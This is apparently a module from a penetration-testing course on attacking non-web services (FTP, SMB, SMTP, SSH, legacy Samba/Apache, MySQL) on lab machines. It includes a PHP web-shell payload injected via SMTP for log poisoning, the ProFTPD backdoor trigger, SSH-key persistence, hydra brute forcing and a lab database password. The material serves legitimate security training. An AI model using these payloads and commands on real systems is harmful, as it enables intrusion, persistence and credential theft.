# 03 — Service and Network Attacks

Not everything is HTTP. Five machines in this path are entered — or escalated —
through a non-web service, and the habits you build here (enumerate the service's
*own* protocol before reaching for a web tool) are the ones that make you effective
on real networks.

Full treatment: [`docs/CONCEPTS.md` §9](../docs/CONCEPTS.md#9-enumerating-specific-services).

---

## 1. FTP — port 21 (Machines 1, 5)

FTP predates modern authentication: it sends usernames, passwords and file
contents in **cleartext**, and it has a built-in convention for public access — the
account **`anonymous`**, traditionally with an email address or nothing as the
password.

```bash
nmap -p21 --script ftp-anon,ftp-vuln-cve2010-4221 target     # is anonymous on? is it a known-vulnerable version?
ftp target                    # then: anonymous / (blank)
curl -s ftp://anonymous:@target/
wget -r ftp://anonymous:@target/          # mirror the whole tree
```

Inside a session: `ls`, `cd`, `binary`, `get`, `mget`, `put`, `recurse`.

> **`binary` before you download anything non-text.** In the default ASCII mode,
> `get` on a ZIP or an image silently corrupts it. This causes an astonishing
> number of "the archive is broken" dead ends.

**Two questions immediately:**

1. **Is anonymous access enabled?** If yes, list everything and look for
   `backup.zip`, `creds.txt`, `id_rsa`, `notes.txt`, `web.config`, `.sql`,
   `password.txt`. Authors leave the next step in a file named something obvious,
   and real admins do too.
2. **Is it writable?** Does `put shell.php` succeed? A writable FTP root that
   overlaps the web document root is a web-shell upload with no exploitation
   required.

**Version-specific:** `ProFTPD 1.3.3c` ships a **compile-time backdoor** — the
source tarball was replaced by an attacker in 2010, so connecting and sending
`HELP ACIDBITCHEZ` opens a root shell on **port 6200**. Machine 1 is exactly this.
Check the banner version against Exploit-DB *before* assuming you need credentials.

---

## 2. SMB — ports 139 and 445 (Machines 8, 11, 12)

SMB is Windows file and printer sharing, present on most Linux servers via Samba.
It is one of the richest enumeration targets there is: shares, users, groups,
password policy and often files.

```bash
smbclient -L //target/ -N              # list shares with a NULL session (no credentials)
smbclient //target/share -N            # connect; then: ls, cd, get, prompt, recurse
smbmap -H target                       # shares AND your permission on each (R/W!)
enum4linux -a target                   # users, groups, shares, policy — one shot
crackmapexec smb target --shares       # modern, fast, scriptable
rpcclient -U '' -N target              # then: enumdomusers, enumdomgroups, queryuser
nmap --script smb-enum-shares,smb-enum-users,smb-security-mode -p445 target
```

**Always try anonymous/NULL access first** — `-N` means "no password". It is the
most common finding on beginner boxes. `smbmap` shows `READ` or `WRITE` per share;
a **writable** share overlapping the web root is an upload primitive.

### RID cycling: enumerating users without credentials

Windows derives a user's RID (relative identifier) from their account, and the
built-in accounts are predictable: `500` is Administrator, `501` Guest, `1000+` are
normal users. If SMB signing is **not required**, you can query a range of RIDs and
get usernames back:

```bash
crackmapexec smb target --rid-brute 2000
rpcclient -U '' -N target -c 'lookupnames administrator'
```

Machine 8 is built on this: a null session plus RID cycling gives you the user
list, which turns a two-unknown brute force into a one-unknown one.

> **Check `smb-security-mode` output.** "Message signing: **disabled**" or
> "not required" means NTLM relay is possible and RID cycling works. "required"
> means both are blocked — and that single line is the difference between an easy
> machine and a hard one.

### What to hunt for inside shares

`backup.zip`, `web.config`, `*.kdbx`, `id_rsa`, `*.sql`, `site.txt`,
`passwords.xls`, `.bash_history`, and — the one Machine 11 turns on — **actual
correspondence**. A leaked email naming a colleague and a project is often enough
to infer a password without cracking anything.

---

## 3. SMTP — port 25 (Machine 12)

SMTP is mail transport, and two of its commands were designed to *validate*
addresses — which means they disclose whether a user exists:

```bash
nc target 25
VRFY michael        # 250 = exists · 550 = does not
EXPN admin          # expand a mailing list into its members
```

Modern servers usually disable both. If so, the same information leaks from
**login error messages** and from `RCPT TO` during a transaction. Automate with
`smtp-user-enum -M VRFY -U usernames.txt -t target`.

**The far more interesting SMTP attack in this path is log poisoning.** If you can
send mail to a local user and then read the spool — or if the MTA logs your
`MAIL FROM` string into a world-readable file — you can write PHP into a file that
an LFI can include:

```bash
nc target 25
MAIL FROM: <?php system($_GET['c']); ?>
RCPT TO: www-data
DATA
<?php system($_GET['c']); ?>
.
```

Machine 12 combines exactly this with an unprotected **Postfix mailbox** you can
read directly, and an LFI that includes the mail spool. Read
[`docs/CONCEPTS.md` §13.2](../docs/CONCEPTS.md#132-local-file-inclusion-lfi)
alongside it.

Also check the banner version against `searchsploit` — `exim` and `sendmail` have
well-known local root exploits.

---

## 4. SSH — port 22 (nearly every machine)

SSH is usually your *destination*, not your entry point. Three things to know:

**Host key fingerprints (TOFU).** The first time you connect you are asked to
accept a fingerprint. There is no way to verify it out-of-band on a lab box — this
is "trust on first use", and it is a real weakness in the protocol. Just note that
the prompt is a security control, not noise.

**Keys are credentials.** If you find `id_rsa`, `id_ed25519` or `authorized_keys`
anywhere, treat it as seriously as a password:

```bash
ssh -i id_rsa user@target
ssh2john id_rsa > key.hash && john --wordlist=rockyou.txt key.hash   # if passphrase-protected
echo 'my pubkey' >> /home/user/.ssh/authorized_keys                  # persistence, if writable
chmod 600 /home/user/.ssh/authorized_keys                            # sshd IGNORES loose permissions
```

That last `chmod` matters: `sshd` silently refuses an `authorized_keys` with
overly permissive modes, which makes "my key doesn't work" a permissions problem
more often than a key problem.

**Non-standard ports.** Machine 4 and others move SSH off 22. `-p-` finds it;
always connect with `-p <port>`.

**Brute force it last, and gently:**

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://target -t 4 -f
```

`-t 4` keeps the rate sane (higher destabilises old VMs and is trivially detected),
`-f` stops at the first success. See [module 04](04-Credentials-and-Cracking.md)
for why the *wordlist* matters far more than the thread count.

---

## 5. Legacy services: the Kioptrix lesson (Machine 5)

Machine 5 is a 2010-era Red Hat box, and it teaches something the modern machines
cannot: **old software is a different discipline.**

You will meet:

| Service | Version | Why it matters |
| --- | --- | --- |
| Apache | 1.3.20 with `mod_ssl` | **OpenFuck / CVE-2002-0082** — a remote root exploit against the SSL module |
| Samba | 2.2.1a | **CVE-2003-0201** — `call_trans2open` remote root |
| `rpc.statd` | old | Historically exploitable via the portmapper |
| SSH | OpenSSH 2.9p2 | Ancient; many known issues |

The skill here is not the exploit — those are public and pre-written. It is:

1. **Getting an exact version** from the banner (`-sV`, or `curl -sI`, or the
   SSL handshake).
2. **Finding the right exploit** for that version *and* the target's architecture
   and distribution. `searchsploit apache 1.3.20`, then read the entry.
3. **Making 20-year-old exploit code compile.** Expect to need `gcc`, specific
   flags, a 32-bit target, patched OpenSSL headers, and occasionally editing the
   source to pick the right offset for the exact distro. This is normal and is the
   actual lesson: real exploitation is often build engineering.
4. **Accepting that it may crash the box.** Snapshot first (see
   [module 00](00-Before-You-Start.md)).

> **Read the exploit before you run it.** Non-negotiable, for three reasons: many
> Exploit-DB entries are *unverified* and some are hostile to whoever runs them;
> you need to know which parameters to change (`RHOST`, target offset, payload);
> and understanding it is the entire point of the exercise.

---

## 6. Databases you will meet directly

| Port | Service | Notes |
| --- | --- | --- |
| 3306 | **MySQL/MariaDB** | Machine 10 exposes it. Try `root:` (empty), `root:root`, and any password you found elsewhere. `mysql -h target -u root -p` |
| 5432 | **PostgreSQL** | Machine 3. Often holds the CMS data |
| 27017 | MongoDB | Not in this path — no auth by default in old versions |
| 6379 | Redis | Not in this path — frequently unauthenticated and writable |

```bash
mysql -h 192.168.56.104 -u root -p'R@v3nSecurity' -e 'show databases;'
mysqldump -h target -u root -p'PASS' wordpress | grep -iE 'flag|password|secret'
```

> **`localhost` vs `127.0.0.1` is not cosmetic.** `mysql -u root` with no host
> connects over a **Unix socket** and authenticates by UID; `-h 127.0.0.1` forces
> **TCP** and authenticates by password. A root account that works locally with no
> password can still require one over TCP — and vice versa. Machine 10 turns on
> this distinction.

If you get MySQL access as `root` with `FILE` privileges, you can read and write
files on the server (`LOAD_FILE()`, `INTO DUMPFILE`) and potentially load a **UDF**
(User-Defined Function) to execute system commands. That is a full privilege
escalation path, covered in
[module 05](05-Linux-Privilege-Escalation.md) and Machine 10.

---

## 7. Exercises

1. **Set up an FTP server on Kali** (`sudo apt install vsftpd`), enable anonymous
   read access, then enumerate it from a second terminal with `nmap --script
   ftp-anon` and `curl`. Confirm you can list and download a file you placed there.
2. **Set up Samba** with one share, then run `enum4linux -a`, `smbmap -H`,
   `smbclient -L -N` and `crackmapexec smb --rid-brute` against it. Compare what
   each tool told you. Which found the most?
3. **Read an SMTP banner** and enumerate users with `VRFY` against a local
   Postfix (`sudo apt install postfix`, choose "Local only"). Then disable
   `VRFY` and confirm the enumeration stops.
4. **Connect to SSH with a wrong host key** and read the warning carefully. Write
   down, in your own words, what attack that warning is designed to prevent.
5. **Version-hunt.** Run `sudo nmap -sV -p- -sC` against any VM you have and, for
   every version string, run `searchsploit -t <service> <version>`. Record which
   ones returned entries and read the top result for each. Do not run anything.

---

## 8. Check yourself

1. What are the two credentials you always try on FTP before anything else?
2. Why must you type `binary` in an FTP session before downloading a ZIP?
3. What does `smbclient -L //target -N` test for, and what does success tell you?
4. What is RID cycling, and what SMB setting must be true for it to work?
5. Which two SMTP commands disclose valid usernames, and why are they usually disabled?
6. Why does `mysql -u root` behave differently from `mysql -h 127.0.0.1 -u root`?
7. Name three reasons to read an exploit's source before running it.
8. Why does an old machine like Kioptrix teach you something a modern one cannot?

---

_Back to [Learning Path 1](README.md) · previous: [02 — Web Attacks](02-Web-Attacks.md) · next: [04 — Credentials and Cracking](04-Credentials-and-Cracking.md)._
